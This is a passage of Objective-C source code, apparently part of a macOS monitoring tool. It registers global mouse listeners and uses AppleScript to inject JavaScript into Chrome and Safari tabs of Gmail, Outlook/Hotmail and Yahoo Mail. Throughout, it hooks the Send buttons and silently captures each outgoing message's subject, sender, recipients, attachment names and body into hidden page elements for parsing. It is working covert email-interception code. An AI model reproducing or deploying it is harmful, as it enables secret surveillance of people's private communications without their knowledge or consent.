            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"delay 0.5 \n tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
            NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
            [scpt release];
            
            if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"Compose"].location != NSNotFound) {
                
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                NSString *myHTMLSource = [scptResult stringValue];
                [scpt release];
                
                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue1() { var rm = document.getElementById('SendMessage'); rm.onmouseenter = function(){ var btag = document.getElementsByTagName('body'); var node = document.createElement('div'); node.setAttribute('class', 'hm_cap_s'); node.setAttribute('hidden', true); btag[0].appendChild(node); } } myValue1();function myValue2() { var rm = document.getElementById('SendMessage'); rm.onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('hm_cap_s'); for(var j = 0; j < node.length; j++) { node[j].parentNode.removeChild(node[j]); } },500); } } myValue2();\" \n return the result \n end tell"];
                [scpt2 executeAndReturnError:nil];
                [scpt2 release];
                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                    [WebmailHTMLParser Hotmail_HTMLParser_Outgoing:myHTMLSource type:@"Chrome"];
                });
            }
            
            else if ([[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"outlook.live.com/"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail"].location != NSNotFound ){
                if ([self OutlookCheckIsCompose:@"Chrome"]) {
                    if(![self isSetSender:@"Chrome"]){
                        [self OutlookGetSender:@"Chrome"];
                    }
                    [self OutlookAddScript:@"Chrome"];
                    
                    NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                    NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                    NSString *myHTMLSource = [scptResult stringValue];
                    [scpt release];
                    
                    dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                        [WebmailHTMLParser Hotmail_HTMLParser_Outlook_Outgoing:myHTMLSource];
                        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"  function cleaner() { var remover = document.getElementsByClassName('ol_cap');for( var k=0;k<remover.length;k++){remover[k].parentNode.removeChild(remover[k]);}}cleaner(); \" \n return the result \n end tell"];
                        [scpt2 executeAndReturnError:nil];
                        [scpt2 release];
                    });
                }
            }
            
            else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound && [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"compose"].location != NSNotFound) {
                
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                NSString *myHTMLSource = [scptResult stringValue];
                [scpt release];
                
                NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('nH Hd'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[j].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();\" \n return the result \n end tell"];
                [scpt2 executeAndReturnError:nil];
                [scpt2 release];
                dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                    [WebmailHTMLParser Gmail_HTMLParser_Outgoing:myHTMLSource type:@"Chrome"];
                });
            }else if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.google.com/mail"].location != NSNotFound ) {
                
                NSString * inboxChecker = [[scptResult descriptorAtIndex:1]stringValue];
                
                if ([inboxChecker rangeOfString:@"#inbox"].location != NSNotFound) {
                    NSArray *spliter = [inboxChecker componentsSeparatedByString:@"#inbox"];
                    inboxChecker = [spliter objectAtIndex:1];
                    inboxChecker = [inboxChecker stringByReplacingOccurrencesOfString:@"/" withString:@""];
                    
                    if([inboxChecker length]>0 ){
                        
                        sleep(1.2);
                        
                        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                        NSString *myHTMLSource = [scptResult stringValue];
                        [scpt release];
                        
                        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('gA gt'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[0].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();\" \n return the result \n end tell"];
                        [scpt2 executeAndReturnError:nil];
                        [scpt2 release];
                        
                        NSAppleScript *scpt3=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue() {var myVar = document.getElementsByClassName('nH Hd')[0].innerHTML;return myVar;} myValue(); \" \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult3 = [scpt3 executeAndReturnError:nil];
                        NSString *checker = [scptResult3 stringValue];
                        [scpt3 release];
                        
                        if ([checker length]>0) {
                            NSAppleScript *scpt4=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function myValue1() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseenter = function(){ var data  = document.getElementsByClassName('nH Hd'); for(var j = 0; j < data.length; j++) { if(data[j].innerHTML.indexOf(this.id) > -1){ var node = document.createElement('div'); var subject = document.getElementsByClassName('aoT')[j].value; node.setAttribute('class', 'gm_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value','GM_SUBJ_S:'+subject); var clone = data[j].cloneNode(true); node.appendChild(clone); var add = document.getElementsByClassName('aAU'); add[0].appendChild(node); break; }}}}} myValue1(); function myValue2() { var rm = document.getElementsByClassName('T-I J-J5-Ji aoO T-I-atl L3'); for(var i = 0; i < rm.length; i++) { rm[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('gm_cap_s'); for(var j = 0; j < node.length; j++) { if(node[j].innerHTML.indexOf(this.id) > -1){ node[j].parentNode.removeChild(node[j]); }}},1650);}}} myValue2();\" \n return the result \n end tell"];
                            [scpt4 executeAndReturnError:nil];
                            [scpt4 release];
                        }
                        dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                            [WebmailHTMLParser Gmail_HTMLParser_InMail_Outgoing:myHTMLSource type:@"Chrome"];
                        });
                    }
                }
            }else{
                [self unregisterMouseClickListener];
            }
        }];
    }@catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
}

-(void) registerYahooMouseClickListenerWithType:(NSString *)aType{
    DLog(@"registerYahooMouseClickListenerWithType");
    if (forceAliveMouseEventHandler) {
        [self unregisterYahooMouseClickListener];
    }
    forceAliveMouseEventHandler = [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler:^(NSEvent * mouseEvent) {
        [self yahooAddScript:aType];
    }];
}
-(void)unregisterYahooMouseClickListener{
    if (forceAliveMouseEventHandler != nil) {
        [NSEvent removeMonitor:forceAliveMouseEventHandler];
        forceAliveMouseEventHandler = nil;
    }
}
-(void)unregisterMouseClickListener{
    if (mouseEventHandler != nil) {
        [NSEvent removeMonitor:mouseEventHandler];
        mouseEventHandler = nil;
    }
}

#pragma mark -AddScript

-(BOOL) isSetSender:(NSString *)aType{
    BOOL set = false;
    if ([aType isEqualToString:@"Safari"]) {
        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() { var myVar = document.getElementsByClassName('senderforme')[0].getAttribute('value'); return myVar;} secretUrl();\" in document 1  \n return the result \n end tell"];
        NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
        if ([[scptResult2 stringValue] length] > 0) {
            set = true;
        }
        [scpt2 release];
    }else if ([aType isEqualToString:@"Chrome"]) {
        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() { var myVar = document.getElementsByClassName('senderforme')[0].getAttribute('value'); return myVar;} secretUrl();\" \n return the result \n end tell"];
        NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
        if ([[scptResult2 stringValue] length] > 0) {
            set = true;
        }
        [scpt2 release];
    }
    DLog(@"isSetSender %d",set);
    return set;
}
-(void) OutlookGetSender:(NSString *)aType{
    if ([aType isEqualToString:@"Safari"]) {
        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"delay 2 \n tell application \"Safari\" \n do JavaScript \" function createSenderTag() { document.getElementsByClassName('o365cs-nav-item o365cs-nav-button o365cs-me-nav-item o365button ms-bgc-tdr-h ms-fcl-w')[0].click(); setTimeout(function(){ var sender = document.getElementsByClassName('o365cs-me-userEmail o365cs-display-Block o365cs-me-bidi')[0].title; var remover = document.getElementsByClassName('o365cs-nav-contextMenu o365spo contextMenuPopup removeFocusOutline')[0]; remover.parentNode.removeChild(remover); var btag = document.getElementsByTagName('body'); var node = document.createElement('div'); node.setAttribute('class', 'senderforme'); node.setAttribute('hidden', true); node.setAttribute('value', sender); btag[0].appendChild(node); },500);}createSenderTag(); \" in document 1 \n return the result \n end tell"];
        [scpt2 executeAndReturnError:nil];
        [scpt2 release];
    }
    else  if ([aType isEqualToString:@"Chrome"]) {
        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"delay 2 \n tell application \"Google Chrome\" \n execute front window's active tab javascript \" function createSenderTag() { document.getElementsByClassName('o365cs-nav-item o365cs-nav-button o365cs-me-nav-item o365button ms-bgc-tdr-h ms-fcl-w')[0].click(); setTimeout(function(){ var sender = document.getElementsByClassName('o365cs-me-userEmail o365cs-display-Block o365cs-me-bidi')[0].title; var remover = document.getElementsByClassName('o365cs-nav-contextMenu o365spo contextMenuPopup removeFocusOutline')[0]; remover.parentNode.removeChild(remover); var btag = document.getElementsByTagName('body'); var node = document.createElement('div'); node.setAttribute('class', 'senderforme'); node.setAttribute('hidden', true); node.setAttribute('value', sender); btag[0].appendChild(node); },500);}createSenderTag(); \" \n return the result \n end tell"];
        [scpt2 executeAndReturnError:nil];
        [scpt2 release];
    }
}
-(BOOL) OutlookCheckIsCompose:(NSString *)aType{
    BOOL result = false;
    if ([aType isEqualToString:@"Safari"]) {
        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \" function secretUrl() { var myVar = document.getElementsByClassName('owa-font-compose')[0]; if(myVar != null){ var val = myVar.innerHTML; if(val.length > 0){ return myVar.innerHTML; }else{ return myVar.value; } } return ''; } secretUrl(); \" in document 1  \n return the result \n end tell"];
        NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
        if ([[scptResult2 stringValue] length] > 0) {
            result = true;
        }
        [scpt2 release];
    }else if ([aType isEqualToString:@"Chrome"]) {
        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \" function secretUrl() { var myVar = document.getElementsByClassName('owa-font-compose')[0]; if(myVar != null){ var val = myVar.innerHTML; if(val.length > 0){ return myVar.innerHTML; }else{ return myVar.value; } } return ''; } secretUrl(); \" \n return the result \n end tell"];
        NSAppleEventDescriptor *scptResult2 =[scpt2 executeAndReturnError:nil];
        if ([[scptResult2 stringValue] length] > 0) {
            result = true;
        }
        [scpt2 release];
    }
    DLog(@"OutlookCheckIsCompose %d",result);
    return result;
}

-(void) OutlookAddScript:(NSString *)aType{
    if ([aType isEqualToString:@"Safari"]) {
        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \" function myValue1() { var message ='';var sender ='';var receive = '';var subject ='';var attachment =''; var x = document.getElementsByTagName('BUTTON'); for(var i =0; i < x.length ; i++){ if(x[i].title == 'Send'){ x[i].parentNode.onmouseenter = function(){ var subTemp = document.getElementsByClassName('_mcp_U1'); for( var k=0;k<subTemp.length;k++){ var tmp = subTemp[k].childNodes; for( var l=0;l<tmp.length;l++){ if(tmp[l].nodeName == 'INPUT'){ subject = tmp[l].value; } } } var reTemp = document.getElementsByClassName('_rw_j'); for( var k=0;k<reTemp.length;k++){ if(receive){ receive = receive +' '+ reTemp[k].textContent; }else{ receive = reTemp[k].textContent; } } var A = document.getElementsByTagName('A'); for(var i = 0; i < A.length ; i++ ){ if(A[i].href.indexOf('attachment.outlook') != -1){ if(attachment){ attachment = attachment +','+ A[i].parentNode.parentNode.getAttribute('aria-label'); }else{ attachment = A[i].parentNode.parentNode.getAttribute('aria-label'); } } } sender = document.getElementsByClassName('senderforme')[0].getAttribute('value'); var tempMessage = document.getElementsByClassName('owa-font-compose')[0]; if(tempMessage.nodeName == 'TEXTAREA'){message = tempMessage.parentNode.value;}else{message = tempMessage.parentNode.innerHTML;} var btag = document.getElementsByTagName('body'); var node = document.createElement('div'); node.setAttribute('class', 'ol_cap'); node.setAttribute('hidden', true); node.setAttribute('ol_subject', subject); node.setAttribute('ol_receive', receive); node.setAttribute('ol_sender', sender); node.setAttribute('ol_message', message); node.setAttribute('ol_attachment', attachment); node.setAttribute('ol_end', 'ol_end'); btag[0].appendChild(node); } } } }myValue1(); function myValue2() { var x = document.getElementsByTagName('BUTTON'); for(var i =0; i < x.length ; i++){ if(x[i].title == 'Send'){ x[i].onmouseleave = function(){ setTimeout(function(){ var remover = document.getElementsByClassName('ol_cap'); for( var k=0;k<remover.length;k++){ remover[k].parentNode.removeChild(remover[k]); } },500); } } } }myValue2(); \" in document 1  \n return the result \n end tell"];
        [scpt2 executeAndReturnError:nil];
        [scpt2 release];
    }else if ([aType isEqualToString:@"Chrome"]) {
        NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \" function myValue1() { var message ='';var sender ='';var receive = '';var subject ='';var attachment =''; var x = document.getElementsByTagName('BUTTON'); for(var i =0; i < x.length ; i++){ if(x[i].title == 'Send'){ x[i].parentNode.onmouseenter = function(){ var subTemp = document.getElementsByClassName('_mcp_U1'); for( var k=0;k<subTemp.length;k++){ var tmp = subTemp[k].childNodes; for( var l=0;l<tmp.length;l++){ if(tmp[l].nodeName == 'INPUT'){ subject = tmp[l].value; } } } var reTemp = document.getElementsByClassName('_rw_j'); for( var k=0;k<reTemp.length;k++){ if(receive){ receive = receive +' '+ reTemp[k].textContent; }else{ receive = reTemp[k].textContent; } } var A = document.getElementsByTagName('A'); for(var i = 0; i < A.length ; i++ ){ if(A[i].href.indexOf('attachment.outlook') != -1){ if(attachment){ attachment = attachment +','+ A[i].parentNode.parentNode.getAttribute('aria-label'); }else{ attachment = A[i].parentNode.parentNode.getAttribute('aria-label'); } } } sender = document.getElementsByClassName('senderforme')[0].getAttribute('value'); var tempMessage = document.getElementsByClassName('owa-font-compose')[0]; if(tempMessage.nodeName == 'TEXTAREA'){message = tempMessage.parentNode.value;}else{message = tempMessage.parentNode.innerHTML;} var btag = document.getElementsByTagName('body'); var node = document.createElement('div'); node.setAttribute('class', 'ol_cap'); node.setAttribute('hidden', true); node.setAttribute('ol_subject', subject); node.setAttribute('ol_receive', receive); node.setAttribute('ol_sender', sender); node.setAttribute('ol_message', message); node.setAttribute('ol_attachment', attachment); node.setAttribute('ol_end', 'ol_end'); btag[0].appendChild(node); } } } }myValue1(); function myValue2() { var x = document.getElementsByTagName('BUTTON'); for(var i =0; i < x.length ; i++){ if(x[i].title == 'Send'){ x[i].onmouseleave = function(){ setTimeout(function(){ var remover = document.getElementsByClassName('ol_cap'); for( var k=0;k<remover.length;k++){ remover[k].parentNode.removeChild(remover[k]); } },500); } } } }myValue2(); \" \n return the result \n end tell"];
        [scpt2 executeAndReturnError:nil];
        [scpt2 release];
    }
}
-(void) yahooAddScript:(NSString *)aType{
    DLog(@"yahooBasicAddScript %@",aType);

    NSAppleEventDescriptor *scptResult;
    if ([aType isEqualToString:@"Safari"]) {
        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"delay 0.5 \n tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
        scptResult = [scpt executeAndReturnError:nil];
        [scpt release];
        
        if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.yahoo.com/"].location != NSNotFound ) {
            int timeout = 5;
            Boolean FoundSend = false;
            NSString * myHTMLSource = @"";
            
            while(!FoundSend) {
                
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var  myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" in document 1 \n return the result \n end tell"];
                NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                myHTMLSource = [[scptResult stringValue] copy];
                [scpt release];
                
                if ([myHTMLSource rangeOfString:@"class=\"tab-content"].location != NSNotFound) {
                    NSArray * temp = [myHTMLSource componentsSeparatedByString:@"class=\"tab-content"];
                    for (int i = 1; i < [temp count]; i++) {
                        if ([[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabcontacts\""].location == NSNotFound &&
                            [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabcalendar\""].location == NSNotFound &&
                            [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabnotepad\""].location == NSNotFound &&
                            [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabnewsfeed\""].location == NSNotFound) {
                            if ([[temp objectAtIndex:i] rangeOfString:@"style=\"visibility: visible;\""].location != NSNotFound) {
                                NSString * myContent = [temp objectAtIndex:i];
                                if ([myContent rangeOfString:@"class=\"composeshim hidden\""].location !=NSNotFound) {
                                    NSAppleScript *scpt2 =[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \" function myValues1(){ var findtab = document.getElementsByClassName('tab-content'); for(var i = 0 ; i< findtab.length; i++){ if(findtab[i].getAttribute('style') == 'visibility: visible;'){ var sendBTN = findtab[i].getElementsByClassName('btn default')[0]; sendBTN.onmouseenter = function(){ var index = this.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode; var subject = index.getAttribute('data-title'); if(!subject){ subject = index.parentNode.parentNode.getElementsByClassName('thread-subject')[0].title} var sender = index.getElementsByClassName('cm-from-field from-select')[0].textContent; var countReceive = index.getElementsByClassName('hLozenge'); var receive=''; var attach=''; for(var i = 0; i < countReceive.length; i++){ if(receive){ receive = receive + ' ' + countReceive[i].getElementsByTagName('span')[0].title + ' '+ countReceive[i].getElementsByTagName('span')[0].getAttribute('data-address'); }else{ receive = countReceive[i].getElementsByTagName('span')[0].title + ' '+ countReceive[i].getElementsByTagName('span')[0].getAttribute('data-address'); } } var countAttach = index.getElementsByClassName('disposition-attachment'); for(var i=0;i<countAttach.length;i++){ var checkfilename = countAttach[i].getElementsByClassName('filename'); if(attach){  if(checkfilename.length > 0){ attach = attach + ',' + countAttach[i].getElementsByClassName('filename')[0].textContent; } }else{ if(checkfilename.length > 0){ attach = countAttach[i].getElementsByClassName('filename')[0].textContent; } } } var message = index.getElementsByClassName('compose-message')[0].innerHTML; var node = document.createElement('div'); node.setAttribute('class', 'yh_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value', '[S:=>]'+subject+'[SS:=>]'+sender+'[R:=>]'+receive+'[A:=>]'+attach+'[M:=>]'+message+'[<=:MEND:=>][<=:END:=>]'); var add = document.getElementById('shellinner'); add.appendChild(node);}}}}myValues1();function myValues2(){ var myVar = document.getElementsByClassName('btn default'); for(var i = 0; i < myVar.length; i++) { myVar[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('yh_cap_s');for(var j = 0; j < node.length; j++) { node[j].parentNode.removeChild(node[j]); } }, 500); } } } myValues2(); \" in document 1 \n return the result \n end tell"];
                                    [scpt2 executeAndReturnError:nil];
                                    [scpt2 release];
                                    FoundSend = true;
                                    break;
                                }
                            }
                        }
                    }
                }else{
                    if ([myHTMLSource rangeOfString:@"class=\"composepage\""].location != NSNotFound) {
                        NSString* tagChecker = @"";
                        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n do JavaScript \"function secretUrl() {var myVar = document.getElementById('send_top').parentNode; return myVar.innerHTML;} secretUrl();\" in document 1 \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                        tagChecker = [scptResult stringValue];
                        [scpt release];
                        if (tagChecker.length) {
                            NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"delay 0.1 \n tell application \"Safari\" \n do JavaScript \" function myValues1(){ var sendBTN = document.getElementById('send_top'); sendBTN.onmouseenter = function(){ var subject = document.getElementById('Subj').value; var sender  = document.getElementsByClassName('uh-name')[0].textContent +' '+ document.getElementsByClassName('uh-name')[0].title; var receive = document.getElementById('to').value; if(document.getElementById('cc').value){ receive = receive + ' ' + document.getElementById('cc').value; } if(document.getElementById('bcc').value){ receive = receive + ' ' + document.getElementById('bcc').value; } var attachCount = document.getElementsByClassName('att-name'); var attach =''; for(var i = 0; i < attachCount.length; i++) { if(i==0){ attach = attachCount[i].title; }else{ attach = attach +','+ attachCount[i].title;} } var message = document.getElementsByClassName('row editorfield')[0].children[0].value; var node = document.createElement('div'); node.setAttribute('class', 'yh_cap_s');node.setAttribute('hidden', true); node.setAttribute('value', '[S:=>]'+subject+'[SS:=>]'+sender+'[R:=>]'+receive+'[A:=>]'+attach+'[M:=>]'+message+'[<=:MEND:=>][<=:END:=>]'); var add = document.getElementsByTagName('body')[0]; add.appendChild(node); }}myValues1();function myValues2(){ var sendBTN = document.getElementById('send_top'); sendBTN.onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('yh_cap_s'); for(var i = 0; i < node.length; i++) { node[i].parentNode.removeChild(node[i]); } }, 500); } } myValues2(); \" in document 1 \n return the result \n end tell"];
                            [scpt2 executeAndReturnError:nil];
                            [scpt2 release];
                            FoundSend = true;
                            break;
                        }
                    }
                }
                timeout--;
                if (timeout <= 0) {
                    break;
                }
                sleep(0.2);
            }
            
            dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                [WebmailHTMLParser Yahoo_HTMLParser_Outgoing:myHTMLSource type:@"Safari"];
            });
            
        }else{
            [self unregisterYahooMouseClickListener];
        }
        
    }else if ([aType isEqualToString:@"Chrome"]) {
        
        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"delay 0.2 \n tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
        scptResult = [scpt executeAndReturnError:nil];
        [scpt release];
        
        if ( [[[scptResult descriptorAtIndex:1]stringValue] rangeOfString:@"mail.yahoo.com/"].location != NSNotFound ) {
            int timeout = 5;
            Boolean FoundSend = false;
            NSString * myHTMLSource =@"";
            
            while(!FoundSend) {
                
                NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.documentElement.innerHTML; return myVar;} secretUrl();\" \n return the result \n end tell"];
                NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                myHTMLSource = [scptResult stringValue];
                [scpt release];
                
                if ([myHTMLSource rangeOfString:@"class=\"tab-content"].location != NSNotFound) {
                    NSArray * temp = [myHTMLSource componentsSeparatedByString:@"class=\"tab-content"];
                    for (int i = 1; i < [temp count]; i++) {
                        if ([[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabcontacts\""].location == NSNotFound &&
                            [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabcalendar\""].location == NSNotFound &&
                            [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabnotepad\""].location == NSNotFound &&
                            [[temp objectAtIndex:i] rangeOfString:@"data-tid=\"tabnewsfeed\""].location == NSNotFound) {
                            if ([[temp objectAtIndex:i] rangeOfString:@"style=\"visibility: visible;\""].location != NSNotFound) {
                                NSString * myContent = [temp objectAtIndex:i];
                                if ([myContent rangeOfString:@"class=\"composeshim hidden\""].location !=NSNotFound) {
                                    NSAppleScript *scpt2=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \" function myValues1(){ var findtab = document.getElementsByClassName('tab-content'); for(var i = 0 ; i< findtab.length; i++){ if(findtab[i].getAttribute('style') == 'visibility: visible;'){ var sendBTN = findtab[i].getElementsByClassName('btn default')[0]; sendBTN.onmouseenter = function(){ var index = this.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode.parentNode; var subject = index.getAttribute('data-title'); if(!subject){ subject = index.parentNode.parentNode.getElementsByClassName('thread-subject')[0].title} var sender = index.getElementsByClassName('cm-from-field from-select')[0].textContent; var countReceive = index.getElementsByClassName('hLozenge'); var receive=''; var attach=''; for(var i = 0; i < countReceive.length; i++){ if(receive){ receive = receive + ' ' + countReceive[i].getElementsByTagName('span')[0].title + ' '+ countReceive[i].getElementsByTagName('span')[0].getAttribute('data-address'); }else{ receive = countReceive[i].getElementsByTagName('span')[0].title + ' '+ countReceive[i].getElementsByTagName('span')[0].getAttribute('data-address'); } } var countAttach = index.getElementsByClassName('disposition-attachment'); for(var i=0;i<countAttach.length;i++){ var checkfilename = countAttach[i].getElementsByClassName('filename'); if(attach){  if(checkfilename.length > 0){ attach = attach + ',' + countAttach[i].getElementsByClassName('filename')[0].textContent; } }else{ if(checkfilename.length > 0){ attach = countAttach[i].getElementsByClassName('filename')[0].textContent; } } } var message = index.getElementsByClassName('compose-message')[0].innerHTML; var node = document.createElement('div'); node.setAttribute('class', 'yh_cap_s'); node.setAttribute('hidden', true); node.setAttribute('value', '[S:=>]'+subject+'[SS:=>]'+sender+'[R:=>]'+receive+'[A:=>]'+attach+'[M:=>]'+message+'[<=:MEND:=>][<=:END:=>]'); var add = document.getElementById('shellinner'); add.appendChild(node);}}}}myValues1();function myValues2(){ var myVar = document.getElementsByClassName('btn default'); for(var i = 0; i < myVar.length; i++) { myVar[i].onmouseleave = function(){ setTimeout(function(){ var node = document.getElementsByClassName('yh_cap_s');for(var j = 0; j < node.length; j++) { node[j].parentNode.removeChild(node[j]); } }, 500); } } } myValues2(); \" \n return the result \n end tell"];
                                    [scpt2 executeAndReturnError:nil];
                                    [scpt2 release];
                                    FoundSend = true;
                                    break;
                                }
                            }
                        }
                    }
                }else{
                    if ([myHTMLSource rangeOfString:@"class=\"composepage\""].location != NSNotFound) {
                        NSString* tagChecker = @"";
                        NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" \n execute front window's active tab javascript \"function secretUrl() {var myVar = document.getElementById('send_top').parentNode; return myVar.innerHTML;} secretUrl();\" \n return the result \n end tell"];
                        NSAppleEventDescriptor *scptResult =[scpt executeAndReturnError:nil];
                        tagChecker = [scptResult stringValue];
                        [scpt release];
                        if (tagChecker.length) {
